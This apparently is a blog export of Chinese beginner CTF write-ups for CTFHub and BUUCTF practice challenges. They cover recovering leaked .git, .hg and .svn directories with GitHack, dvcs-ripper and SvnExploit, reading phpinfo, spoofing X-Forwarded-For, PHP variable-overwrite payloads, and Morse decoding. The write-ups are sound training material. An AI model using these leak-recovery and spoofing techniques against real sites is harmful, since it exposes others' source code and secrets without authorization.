    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用<code>BugScanTeam的GitHack</code>完成本题</p>

  </div>

<p>与log文件的恢复相同，仅有一点变化</p>
<p>打开靶场，用工具<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行.git文件恢复</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://你的靶场地址/.git</span><br></pre></td></tr></table></figure></div>

<p>进入dist内生成的文件，输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git stash list</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/image-20240917180019024.png"
                      alt="image-20240917180019024"
                ></p>
<p>成功恢复一个<code>.txt</code>文件，打开就可以得到<code>flag</code>了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/image-20240917180115597.png"
                      alt="image-20240917180115597"
                ></p></div><div class="tab-pane" id="信息泄露-git泄露-3"><h3 id="题目-Index"><a href="#题目-Index" class="headerlink" title="题目-Index"></a>题目-Index</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用<code>BugScanTeam的GitHack</code>完成本题</p>

  </div>

<p>与前面也是一样的</p>
<p>打开靶场，用工具<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行.git文件恢复</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://你的靶场地址/.git</span><br></pre></td></tr></table></figure></div>

<p>恢复后进入文件夹直接</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git show</span><br></pre></td></tr></table></figure></div>

<p>flag就出来了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/image-20240917180700233.png"
                      alt="image-20240917180700233"
                ></p></div></div></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做题时要根据题目来做题，半做半猜，不要盲目乱入手</p>
<p>在实际做题时会遇到各种坑，需要多花耐心慢慢琢磨（由于本人也是新手，也花了好些时间搞这节。。。）</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;git泄露</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>莫尔斯电码</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81/</url>
    <content><![CDATA[<h1 id="莫尔斯电码"><a href="#莫尔斯电码" class="headerlink" title="莫尔斯电码"></a>莫尔斯电码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个音频的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81/image-20240919195612187.png"
                      alt="image-20240919195612187"
                ></p>
<p>试听一下能发现是滴答的感觉，那就可以从莫斯密码入手了</p>
<p>使用工具<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>看音频长短，再对照摩斯密码进行还原</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919195226161.png"
                      alt="image-20240919195226161"
                ></p>
<p>整个的提取出来是</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">..-.  .-..  .-  --. </span><br><span class="line">..  ... </span><br><span class="line">.-  ..  .-.  .-.  ..-  -..  -.. .  .-. </span><br><span class="line">--  ---  .-.  ...  . </span><br><span class="line">-.-.  ---  -..  .</span><br></pre></td></tr></table></figure></div>

<p>用<a class="link"   href="https://www.lddgo.net/encrypt/morse" >在线解码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>可以就得到flag了，<code>flag is airrudder morrse code</code></p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>这里提交不了平台，不知道什么原因，平台显示的提交人数也为0</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81/image-20240919201706146.png"
                      alt="image-20240919201706146"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于摩尔斯电码，一般不会有这种题，因为没有技术含量还浪费时间，留个印象就行</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.3.1%20%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81%E4%B8%8E%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99]%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>信息泄露-HG泄露</title>
    <url>/2024/09/17/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="信息泄露-HG泄露"><a href="#信息泄露-HG泄露" class="headerlink" title="信息泄露-HG泄露"></a>信息泄露-HG泄露</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2>
  <div class="note p-4 mb-4 rounded-small info">
    <p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>

  </div>

<p>打开靶场，这道题比较陌生，所以需要参考其他资料来完成<a class="link"   href="https://blog.csdn.net/hxhxhxhxx/article/details/112759999?ops_request_misc=%7B%22request_id%22:%22169586988116800226538806%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169586988116800226538806&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-112759999-null-null.142%5Ev94%5Einsert_down28v1&utm_term=ctfhub%E6%8A%80%E8%83%BD%E6%A0%91&spm=1018.2226.3001.4187" >CTFHUB技能树（全详细解析含进阶）-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917181428325.png"
                      alt="image-20240917181428325"
                ></p>
<p>根据资料也是和.SVN一样的恢复方式</p>
<p>使用工具，<a class="link"   href="https://github.com/kost/dvcs-ripper" >dvsc-ripper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个工具需要很多环境和包，所以建议在kali里面执行</p>
<p>进入kali，安装工具所需依赖库</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure></div>

<p>安装完后，进入到工具目录，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rip-hg.pl -v -u 地址/.hg/</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917182029336.png"
                      alt="image-20240917182029336"
                ></p>
<p>进入.hg文件，深度查找flag文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917182149228.png"
                      alt="image-20240917182149228"
                ></p>
<p>回到靶场添加目录文件即可得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917182221366.png"
                      alt="image-20240917182221366"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917182227738.png"
                      alt="image-20240917182227738"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种题目考察的不多，主要就是了解一下有这么个信息可能会泄露，然后工具的使用会操作就行</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;hg泄露</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>信息泄露-SVN泄露</title>
    <url>/2024/09/12/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="信息泄露-SVN泄露"><a href="#信息泄露-SVN泄露" class="headerlink" title="信息泄露-SVN泄露"></a>信息泄露-SVN泄露</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
<p>根据题目需要提前准备工具<a class="link"   href="https://github.com/admintony/svnExploit.git" >SVNExploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>打开靶场看到和题目提示一样，是一个SVN泄露</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/image-20240913005004198.png"
                      alt="image-20240913005004198"
                ></p>
<p>使用工具检测目标是否存在SVN工具（例行检查）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python SvnExploit.py -u 目标地址/.svn</span><br></pre></td></tr></table></figure></div>

<p>初次使用会有报错，下载pip包就可以</p>
<blockquote>
<p>或者直接在kali里面使用工具，kali里面的py包很全面</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install prettytable -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/image-20240913005735686.png"
                      alt="image-20240913005735686"
                ></p>
<p>再次运行之后可以看到有结果输出，证明有svn泄露</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/image-20240913005921606.png"
                      alt="image-20240913005921606"
                ></p>
<p>在原来的命令后面加上<code>--dump</code>参数，把源码下载下来</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python SvnExploit.py -u 目标地址/.svn --dump</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/image-20240913010130190.png"
                      alt="image-20240913010130190"
                ></p>
<p>恢复的文件有一个<code>wc.db</code>，是一个数据库文件，可以查看到文件索引</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/image-20240913012737667.png"
                      alt="image-20240913012737667"
                ></p>
<p>使用curl命令访问可以文件检查网页源代码是否存在flag，检查均返回404</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://challenge-2465e7edfc335d47.sandbox.ctfhub.com:10800/index.html13523.txt</span><br><span class="line">curl http://challenge-2465e7edfc335d47.sandbox.ctfhub.com:10800/flag_135183523.txt</span><br></pre></td></tr></table></figure></div>

<p>根据上面所示，并没有flag文件，也确实没有直接被下载下来，毕竟题上也写了是在旧版本里面，所以使用其他工具进行还原</p>
<p><a class="link"   href="https://github.com/kost/dvcs-ripper" >dvsc-ripper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个工具需要很多环境和包，所以建议在kali里面执行</p>
<p>进入kali，安装工具所需依赖库</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure></div>

<p>安装完后，进入到工具目录，执行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-svn.pl -v -u 目标地址/.svn </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/image-20240913011925973.png"
                      alt="image-20240913011925973"
                ></p>
<p>既然是svn文件，那就会在.svn目录下面，低版本SVN具体路径为text-base目录，高版本SVN为pristine目录，然后层层往下查找，中途肯定会有找不到的时候，可以将文件放到实体机，用文件内容搜索工具搜索flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-SVN%E6%B3%84%E9%9C%B2/image-20240913012313165.png"
                      alt="image-20240913012313165"
                ></p>
<p>最后flag被找出来，又解决了一道题</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个题目虽然与git泄露类似，但因为是svn，所以恢复起来没那么常见，这个文件我也是在CSDN上面的writeup找到的，初学者遇到完全没思路或者已经行不通的时候就多去网上找找资料，慢慢培养能力</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;svn泄露</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>信息泄露-PHPINFO</title>
    <url>/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-PHPINFO/</url>
    <content><![CDATA[<h1 id="信息泄露-目录遍历"><a href="#信息泄露-目录遍历" class="headerlink" title="信息泄露-目录遍历"></a>信息泄露-目录遍历</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，看到这样的页面，点进去就是phpinfo的信息，也许我们要的flag就藏在里面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-PHPINFO/image-20240914223800500.png"
                      alt="image-20240914223800500"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-PHPINFO/image-20240914223835290.png"
                      alt="image-20240914223835290"
                ></p>
<p>在页面上用<code>ctrl+F</code>搜索功能，搜索flag，即可找到我们要的flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-PHPINFO/image-20240914223931169.png"
                      alt="image-20240914223931169"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题也是由于网站没有配置好，被别人访问到了phpinfo，里面本身就有很多可被利用的信息，所以要注意配置文件，虽然但是又水了一篇 ( ｡ớ ₃ờ)ھ</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;PHPINFO</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU BURP COURSE 1</title>
    <url>/2024/09/12/ctf/writeup/web/buuctf/BUU-BURP-COURSE-1/</url>
    <content><![CDATA[<h1 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>开启靶场后，只有一行文字，查看F12也没有东西，我们就抓包来看看，这里用的BP</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/BUU-BURP-COURSE-1/image-20240912212137491.png"
                      alt="image-20240912212137491"
                ></p>
<p>尝试使用<code>X-Forwarded-For</code>或者<code>X-Client</code>改包，返回这样的页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/BUU-BURP-COURSE-1/image-20240912212428190.png"
                      alt="image-20240912212428190"
                ></p>
<p>查看网页源码可以看到密码，但其实没有什么用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/BUU-BURP-COURSE-1/image-20240912212506652.png"
                      alt="image-20240912212506652"
                ></p>
<p>我们直接点击登录继续抓包，加上上一步的伪造本地请求，即可得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/BUU-BURP-COURSE-1/image-20240912212702328.png"
                      alt="image-20240912212702328"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>新手试水题，水~</p>
<p><a class="link"   href="https://buuoj.cn/challenges#BUU%20BURP%20COURSE%201" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 Mark-loves-cat*</title>
    <url>/2024/09/13/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DMark-loves-cat/</url>
    <content><![CDATA[<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat*"></a>[BJDCTF2020]Mark loves cat*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，可以看到一个前段页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914162948928.png"
                      alt="image-20240914162948928"
                ></p>
<p>上下翻找在页面上并没有什么提示和能入手的，那就做一下目录扫描等信息收集，这里我用的<a class="link"   href="https://github.com/maurosoria/dirsearch" >dirsearch <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，我新建了一个示例文件存放扫描目录，正常情况扫描需要花好些时间</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914172851299.png"
                      alt="image-20240914172851299"
                ></p>
<p>如图可以看到可能存在.git信息泄露</p>
<p>使用python3的<a class="link"   href="https://github.com/lijiejie/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具进行恢复</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173027155.png"
                      alt="image-20240914173027155"
                ></p>
<blockquote>
<p>python2的<a class="link"   href="https://github.com/gakki429/Git_Extract" >Git_Extract <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是用于恢复.git文件的，有时做到题可能会需要</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914175301365.png"
                      alt="image-20240914175301365"
                ></p>
</blockquote>
<p>恢复后发现只有两个php文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173134132.png"
                      alt="image-20240914173134132"
                ></p>
<p>flag.php文件如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173236648.png"
                      alt="image-20240914173236648"
                ></p>
<p>index.php文件如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173229008.png"
                      alt="image-20240914173229008"
                ></p>
<p>显然要进行代码审计</p>
<blockquote>
<p>这个东西真的是需要自己去慢慢看的，慢慢看才能学到东西，主要涉及的就是可变变量，先手建议先了解即可，跟着看看做做，见多了自然就悟了</p>
</blockquote>
<p>遇到if比较多的情况优先看关键字，最后有<code>$flag</code>，再往前看到有<code>$yds</code>是与flag有关的，再往前可以看到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173526537.png"
                      alt="image-20240914173526537"
                ></p>
<p>这里就可以通过GET传递</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://CTF/?yds=flag</span><br></pre></td></tr></table></figure></div>

<p>此时<code>$x=yds,$y=flag</code>，再有源码里面的<code>$$x=$$y</code>，把<code>$yds=$flag</code>，将<code>$flag</code>的值赋值给了<code>$yds</code>，当遇到<code>exit()</code>函数的时候就会输出flag值了</p>
<p>所以在传入参数的时候，将<code>yds=flag</code>传入即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914174420469.png"
                      alt="image-20240914174420469"
                ></p>
<p>最后通过查看源代码，成功得到了flag</p>
<h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><p>给出3种本人做出来的答案，第一种答案已讲解，其余答案的详解可以看其他博主的<a class="link"   href="https://www.cnblogs.com/Nestar/p/15922456.html" >链接在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，再自己推到一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:yds=flag</span><br><span class="line"></span><br><span class="line">payload2:handsome=flag&amp;flag=handsome</span><br><span class="line"></span><br><span class="line">payload3:flag=flag&amp;ls=flag</span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题有不小难度，在于对php函数的理解和php变量覆盖的领悟，关于这道题总共有4种解法，本人最开始也是看不懂，这里就写了本人根据书上看懂的3种解法，更多的解法和详解可以在其他博主博客里面看到<a class="link"   href="https://www.cnblogs.com/Nestar/p/15922456.html" >链接在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，可以自己去看看，我就不搬过来了</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[BJDCTF2020]Mark%20loves%20cat" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>web入门-粗心的小李</title>
    <url>/2024/09/12/ctf/writeup/web/buuctf/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/</url>
    <content><![CDATA[<h1 id="web入门-粗心的小李"><a href="#web入门-粗心的小李" class="headerlink" title="[web入门]粗心的小李"></a>[web入门]粗心的小李</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场看到是Git泄露，首先就是检测再还原找flag</p>
<p>会用到工具python2的<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和python3的<a class="link"   href="https://github.com/lijiejie/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，需要提前准备，别问为什么两个都要下，接下来你就知道了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913013606873.png"
                      alt="image-20240913013606873"
                ></p>
<p>检测可以通过加&#x2F;.git&#x2F;，若返回是403则说明有可能存在源码泄露；或者通过目录扫描工具检测</p>
<p>检测出存在可能后使用工具python2的<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行恢复</p>
<p>需要用到python2，建议直接kali，kali自带有python2和很多库</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>

